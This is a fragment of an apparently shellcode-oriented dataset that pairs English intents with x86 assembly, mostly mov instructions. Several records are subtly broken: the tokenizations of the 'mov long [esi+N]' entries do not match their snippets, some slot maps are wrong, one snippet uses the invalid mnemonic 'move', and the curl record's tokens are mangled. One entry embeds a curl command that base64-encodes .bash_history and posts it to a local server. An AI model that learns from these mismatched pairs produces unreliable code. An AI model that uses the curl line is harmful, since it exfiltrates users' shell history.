    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory address temp4 to edx",
    "rewritten_intent": "move the contents at memory address temp4 to edx",
    "snippet": "mov edx, [temp4]",
    "slot_map": {
      "temp4": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory address z to edx",
    "rewritten_intent": "move the contents at memory address z to edx",
    "snippet": "mov edx, [z]",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "z",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "z",
      "]"
    ]
  },
  {
    "intent": "move the value 0x1234567 into the edx register",
    "rewritten_intent": "move the value 0x1234567 into the edx register",
    "snippet": "mov edx, 0x1234567",
    "slot_map": {
      "0x1234567": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 1 into edx",
    "rewritten_intent": "move 1 into edx",
    "snippet": "mov edx, 1",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "1",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "move integer 11 to edx",
    "rewritten_intent": "move integer 11 to edx",
    "snippet": "mov edx, 11",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "integer",
      "11",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "11"
    ]
  },
  {
    "intent": "move 12 to edx",
    "rewritten_intent": "move 12 to edx",
    "snippet": "mov edx, 12",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "12",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "12"
    ]
  },
  {
    "intent": "move 13 into edx",
    "rewritten_intent": "move 13 into edx",
    "snippet": "mov edx, 13",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "13",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "13"
    ]
  },
  {
    "intent": "move decimal 2 into edx",
    "rewritten_intent": "move decimal 2 into edx",
    "snippet": "mov edx, 2",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "decimal",
      "2",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "move decimal number 255 into edx",
    "rewritten_intent": "move decimal number 255 into edx",
    "snippet": "mov edx, 255",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "decimal",
      "number",
      "255",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "255"
    ]
  },
  {
    "intent": "move 3 decimal into edx",
    "rewritten_intent": "move 3 decimal into edx",
    "snippet": "mov edx, 3",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "3",
      "decimal",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "3"
    ]
  },
  {
    "intent": "move 43 decimal into edx",
    "rewritten_intent": "move 43 decimal into edx",
    "snippet": "mov edx, 43",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "43",
      "decimal",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "43"
    ]
  },
  {
    "intent": "move decimal 43 into edx",
    "rewritten_intent": "move decimal 43 into edx",
    "snippet": "mov edx, 43",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "decimal",
      "43",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "43"
    ]
  },
  {
    "intent": "move 66729180 into edx",
    "rewritten_intent": "move 66729180 into edx",
    "snippet": "mov edx, 66729180",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "66729180",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "66729180"
    ]
  },
  {
    "intent": "store 78 decimal into edx",
    "rewritten_intent": "store 78 decimal into edx",
    "snippet": "mov edx, 78",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "store",
      "78",
      "decimal",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "78"
    ]
  },
  {
    "intent": "move 8 decimal into edx",
    "rewritten_intent": "move 8 decimal into edx",
    "snippet": "mov edx, 8",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "8",
      "decimal",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "8"
    ]
  },
  {
    "intent": "put 8 into edx",
    "rewritten_intent": "put 8 into edx",
    "snippet": "mov edx, 8",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "put",
      "8",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "8"
    ]
  },
  {
    "intent": "move number 9 into edx",
    "rewritten_intent": "move number 9 into edx",
    "snippet": "mov edx, 9",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "number",
      "9",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "9"
    ]
  },
  {
    "intent": "move buff to edx",
    "rewritten_intent": "move buff to edx",
    "snippet": "mov edx, buff",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "buff",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "buff"
    ]
  },
  {
    "intent": "move bufflen into edx",
    "rewritten_intent": "move bufflen into edx",
    "snippet": "mov edx, bufflen",
    "slot_map": {
      "bufflen": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move donelen into edx",
    "rewritten_intent": "move donelen into edx",
    "snippet": "mov edx, donelen",
    "slot_map": {
      "donelen": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move dword 0x65676760 into edx",
    "rewritten_intent": "move dword 0x65676760 into edx",
    "snippet": "mov edx, dword 0x65676760",
    "slot_map": {
      "0x65676760": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "dword",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "move the doubleword 0x65676760 into edx",
    "rewritten_intent": "move the doubleword 0x65676760 into edx",
    "snippet": "mov edx, dword 0x65676760",
    "slot_map": {
      "0x65676760": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "doubleword",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "move eatlen into edx",
    "rewritten_intent": "move eatlen into edx",
    "snippet": "mov edx, eatlen",
    "slot_map": {
      "eatlen": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move eax into edx",
    "rewritten_intent": "move eax into edx",
    "snippet": "mov edx, eax",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "backup eax into edx",
    "rewritten_intent": "backup eax into edx",
    "snippet": "mov edx, eax",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "backup",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move ebp into edx",
    "rewritten_intent": "move ebp into edx",
    "snippet": "mov edx, ebp",
    "slot_map": {
      "ebp": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move ecx into edx",
    "rewritten_intent": "move ecx into edx",
    "snippet": "mov edx, ecx",
    "slot_map": {
      "ecx": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move ecx to edx",
    "rewritten_intent": "move ecx to edx",
    "snippet": "mov edx, ecx",
    "slot_map": {
      "ecx": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the address of environment variable into edx",
    "rewritten_intent": "move the address of environment variable into edx",
    "snippet": "mov edx, environment",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "environment",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "environment"
    ]
  },
  {
    "intent": "move esi into edx",
    "rewritten_intent": "move esi into edx",
    "snippet": "mov edx, esi",
    "slot_map": {
      "esi": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move esp into edx",
    "rewritten_intent": "move esp into edx",
    "snippet": "mov edx, esp",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "esp",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the contents of the esp register into the edx register",
    "rewritten_intent": "move the contents of the esp register into the edx register",
    "snippet": "mov edx, esp",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "esp",
      "register",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the stack pointer into edx",
    "rewritten_intent": "move the stack pointer into edx",
    "snippet": "mov edx, esp",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "stack",
      "pointer",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move filename into edx",
    "rewritten_intent": "move filename into edx",
    "snippet": "mov edx, filename",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "filename",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "filename"
    ]
  },
  {
    "intent": "move hellolen into edx",
    "rewritten_intent": "move hellolen into edx",
    "snippet": "mov edx, hellolen",
    "slot_map": {
      "hellolen": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move variable len to edx",
    "rewritten_intent": "move variable len to edx",
    "snippet": "mov edx, len",
    "slot_map": {
      "len": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "variable",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move m_src4 to edx",
    "rewritten_intent": "move m_src4 to edx",
    "snippet": "mov edx, m_src4",
    "slot_map": {
      "m_src4": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move n to edx",
    "rewritten_intent": "move n to edx",
    "snippet": "mov edx, n",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "n",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "n"
    ]
  },
  {
    "intent": "move readbuffer into edx",
    "rewritten_intent": "move readbuffer into edx",
    "snippet": "mov edx, readbuffer",
    "slot_map": {
      "readbuffer": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move readlen into edx",
    "rewritten_intent": "move readlen into edx",
    "snippet": "mov edx, readlen",
    "slot_map": {
      "readlen": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move address of response variable into edx",
    "rewritten_intent": "move address of response variable into edx",
    "snippet": "mov edx, response",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "response",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "response"
    ]
  },
  {
    "intent": "move the contents of src variable into edx",
    "rewritten_intent": "move the contents of src variable into edx",
    "snippet": "mov edx, src",
    "slot_map": {
      "src": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of tmp variable into edx",
    "rewritten_intent": "move the contents of tmp variable into edx",
    "snippet": "mov edx, tmp",
    "slot_map": {
      "tmp": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the number of bytes of var1 into edx",
    "rewritten_intent": "move the number of bytes of var1 into edx",
    "snippet": "mov edx, type var1",
    "slot_map": {
      "var1": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "number",
      "bytes",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "type",
      "var0"
    ]
  },
  {
    "intent": "move the contents of memory address ebp+12 into esi",
    "rewritten_intent": "move the contents of memory address ebp+12 into esi",
    "snippet": "mov esi, [ebp+12]",
    "slot_map": {
      "ebp+12": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move 0x222933f0 into esi",
    "rewritten_intent": "move 0x222933f0 into esi",
    "snippet": "mov esi, 0x222933f0",
    "slot_map": {
      "0x222933f0": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x243525f0 into esi",
    "rewritten_intent": "move 0x243525f0 into esi",
    "snippet": "mov esi, 0x243525f0",
    "slot_map": {
      "0x243525f0": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x34399797 into esi",
    "rewritten_intent": "move 0x34399797 into esi",
    "snippet": "mov esi, 0x34399797",
    "slot_map": {
      "0x34399797": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x353ffc3b into esi",
    "rewritten_intent": "move 0x353ffc3b into esi",
    "snippet": "mov esi, 0x353ffc3b",
    "slot_map": {
      "0x353ffc3b": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x563a1f3e into esi",
    "rewritten_intent": "move 0x563a1f3e into esi",
    "snippet": "mov esi, 0x563a1f3e",
    "slot_map": {
      "0x563a1f3e": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x65636170 into esi",
    "rewritten_intent": "move 0x65636170 into esi",
    "snippet": "mov esi, 0x65636170",
    "slot_map": {
      "0x65636170": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x68732f2f into esi",
    "rewritten_intent": "move 0x68732f2f into esi",
    "snippet": "mov esi, 0x68732f2f",
    "slot_map": {
      "0x68732f2f": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x72702f2f into esi",
    "rewritten_intent": "move 0x72702f2f into esi",
    "snippet": "mov esi, 0x72702f2f",
    "slot_map": {
      "0x72702f2f": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x735f6176 into esi",
    "rewritten_intent": "move 0x735f6176 into esi",
    "snippet": "mov esi, 0x735f6176",
    "slot_map": {
      "0x735f6176": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x91969dd0 into esi",
    "rewritten_intent": "move 0x91969dd0 into esi",
    "snippet": "mov esi, 0x91969dd0",
    "slot_map": {
      "0x91969dd0": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xd2c45e5e into esi",
    "rewritten_intent": "move 0xd2c45e5e into esi",
    "snippet": "mov esi, 0xd2c45e5e",
    "slot_map": {
      "0xd2c45e5e": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 10 into esi",
    "rewritten_intent": "move 10 into esi",
    "snippet": "mov esi, 10",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "10",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "10"
    ]
  },
  {
    "intent": "move 9 into esi",
    "rewritten_intent": "move 9 into esi",
    "snippet": "mov esi, 9",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "9",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "9"
    ]
  },
  {
    "intent": "place address buff into esi",
    "rewritten_intent": "place address buff into esi",
    "snippet": "mov esi, buff",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "place",
      "address",
      "buff",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "buff"
    ]
  },
  {
    "intent": "move pointer in eax into esi",
    "rewritten_intent": "move pointer in eax into esi",
    "snippet": "mov esi, eax",
    "slot_map": {
      "eax": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "pointer",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move eax into esi",
    "rewritten_intent": "move eax into esi",
    "snippet": "mov esi, eax",
    "slot_map": {
      "eax": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move ecx into esi",
    "rewritten_intent": "move ecx into esi",
    "snippet": "mov esi, ecx",
    "slot_map": {
      "ecx": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move remainder into esi",
    "rewritten_intent": "move remainder into esi",
    "snippet": "mov esi, edx",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "remainder",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "edx"
    ]
  },
  {
    "intent": "move esp into esi",
    "rewritten_intent": "move esp into esi",
    "snippet": "mov esi, esp",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "esp",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move v to esi",
    "rewritten_intent": "move v to esi",
    "snippet": "mov esi, v",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "v",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "v"
    ]
  },
  {
    "intent": "move v_src to esi",
    "rewritten_intent": "move v_src to esi",
    "snippet": "mov esi, v_src",
    "slot_map": {
      "v_src": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "copy the address of var into esi",
    "rewritten_intent": "copy the address of var into esi",
    "snippet": "mov esi, var",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "copy",
      "address",
      "var",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "var"
    ]
  },
  {
    "intent": "move the contents of the ebp register ino the esp register",
    "rewritten_intent": "move the contents of the ebp register ino the esp register",
    "snippet": "mov esp, ebp",
    "slot_map": {
      "ebp": "var0",
      "ino": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "var1",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the ebp register into the esp register",
    "rewritten_intent": "move the contents of the ebp register into the esp register",
    "snippet": "mov esp, ebp",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the esi register into the long starting at the address [esi+18]",
    "rewritten_intent": "move the contents of the esi register into the long starting at the address [esi+18]",
    "snippet": "mov long [esi+18], esi",
    "slot_map": {
      "esi+18": "var1",
      "[": "var0",
      "]": "var2"
    },
    "intent_tokens": [
      "move",
      "contents",
      "esi",
      "register",
      "long",
      "starting",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the ebx register into the long starting at the address [esi+22]",
    "rewritten_intent": "move the contents of the ebx register into the long starting at the address [esi+22]",
    "snippet": "mov long [esi+22], ebx",
    "slot_map": {
      "esi+22": "var2",
      "ebx": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "long",
      "starting",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the esi register into the long starting at the address [esi+22]",
    "rewritten_intent": "move the contents of the esi register into the long starting at the address [esi+22]",
    "snippet": "mov long [esi+22], esi",
    "slot_map": {
      "esi+22": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "esi",
      "register",
      "long",
      "starting",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the eax register into the long starting at the address [esi+26]",
    "rewritten_intent": "move the contents of the eax register into the long starting at the address [esi+26]",
    "snippet": "mov long [esi+26], eax",
    "slot_map": {
      "esi+26": "var2",
      "eax": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "long",
      "starting",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the ebx register into the long starting at the address [esi+26]",
    "rewritten_intent": "move the contents of the ebx register into the long starting at the address [esi+26]",
    "snippet": "mov long [esi+26], ebx",
    "slot_map": {
      "esi+26": "var2",
      "ebx": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "long",
      "starting",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the eax register into the long starting at the address [esi+30]",
    "rewritten_intent": "move the contents of the eax register into the long starting at the address [esi+30]",
    "snippet": "mov long [esi+30], eax",
    "slot_map": {
      "esi+30": "var2",
      "eax": "var0",
      "[": "var1",
      "]": "var3"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "long",
      "starting",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move eax into sock_reg",
    "rewritten_intent": "move eax into sock_reg",
    "snippet": "mov sock_reg, eax",
    "slot_map": {
      "sock_reg": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "transfer the value 48 in the memory variable total",
    "rewritten_intent": "transfer the value 48 in the memory variable total",
    "snippet": "mov total, 48",
    "slot_map": {},
    "intent_tokens": [
      "transfer",
      "value",
      "48",
      "memory",
      "variable",
      "total"
    ],
    "snippet_tokens": [
      "mov",
      "total",
      ",",
      "48"
    ]
  },
  {
    "intent": "move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx",
    "rewritten_intent": "move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx",
    "snippet": "mov word [ebx], 2",
    "slot_map": {
      "16-bit": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "integer",
      "representation",
      "2",
      "2",
      "bytes",
      "starting",
      "address",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "word",
      "[",
      "var1",
      "]",
      ",",
      "2"
    ]
  },
  {
    "intent": "move 0x776f into the word in [esp+0x1]",
    "rewritten_intent": "move 0x776f into the word in [esp+0x1]",
    "snippet": "mov word [esp+0x1], 0x776f",
    "slot_map": {
      "esp+0x1": "var3",
      "0x776f": "var0",
      "[": "var2"
    },
    "intent_tokens": [
      "move",
      "var0",
      "word",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "word",
      "[",
      "var1",
      "]",
      ",",
      "2"
    ]
  },
  {
    "intent": "move eax to x variable",
    "rewritten_intent": "move eax to x variable",
    "snippet": "mov x, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "x",
      "variable"
    ],
    "snippet_tokens": [
      "mov",
      "x",
      ",",
      "var0"
    ]
  },
  {
    "intent": "backup edx into ecx",
    "rewritten_intent": "backup edx into ecx",
    "snippet": "move ecx, edx",
    "slot_map": {
      "edx": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "backup",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "move",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post'",
    "rewritten_intent": "define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post'",
    "snippet": "msg db 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post', 0x0a",
    "slot_map": {
      "'curl http://localhost:8080 -d '": "var0",
      "'$(cat .bash_history | base64 -w 0) -x post'": "var2",
      "bash_history": "var4",
      "base64 -w": "var6",
      "data='$(cat": "var1",
      ".bash_history": "var3",
      "|": "var5",
      "base64": "var7"
    },
    "intent_tokens": [
      "define",
      "msg",
      "byte",
      "string",
      "var0data=var2"
    ],
    "snippet_tokens": [
      "msgvar5",
      "var5dbvar5",
      "var5var0data=var5",
      "''",
      "var5",
      "$",
      "(",
      "var5catvar5",
      "var5.var5var4var5",
      "var5var5var5",
      "var5var6var5",
      "var50var5",
      ")",
      "var5",
      "var5-xvar5",
      "var5postvar5",
      "''",
      "var5",
      ",",
      "var5",
      "var50x0a"
    ]
  },
  {
    "intent": "declare msg string containing 'hello world!'",
    "rewritten_intent": "declare msg string containing 'hello world!'",
    "snippet": "msg db 'hello, world!', 0xa",
    "slot_map": {
      "'hello world!'": "var0"
    },
    "intent_tokens": [
      "declare",
      "msg",
      "string",
      "containing",
      "var0"
    ],
    "snippet_tokens": [
      "msg",
      "db",
      "'hello",
      ",",
      "world",
      "!",
